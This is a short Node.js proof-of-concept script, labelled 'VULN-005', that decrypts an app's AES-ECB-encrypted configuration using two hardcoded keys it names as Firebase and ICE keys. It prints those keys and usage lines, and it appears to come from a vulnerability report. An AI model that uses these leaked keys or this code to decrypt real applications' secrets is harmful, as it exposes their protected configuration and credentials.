

const crypto = require('crypto');

const FIREBASE_KEY = Buffer.from('keysefghijkldesk', 'utf8');
const ICE_KEY = Buffer.from('icesefghijklmnop', 'utf8');

function decryptECB(ciphertextBase64, key) {
    try {
        const decipher = crypto.createDecipheriv('aes-128-ecb', key, null);
        decipher.setAutoPadding(true);
        let decrypted = decipher.update(ciphertextBase64, 'base64', 'utf8');
        decrypted += decipher.final('utf8');
        return JSON.parse(decrypted);
    } catch (err) {
        return `[Error Decrypting]: ${err.message}`;
    }
}

console.log("=== VULN-005: Config Decryption PoC ===");
console.log("Firebase Key:  keysefghijkldesk");
console.log("ICE Key:       icesefghijklmnop");
console.log("\nUsage in code:");
console.log("const config = decryptECB(encryptedPayload, FIREBASE_KEY);");
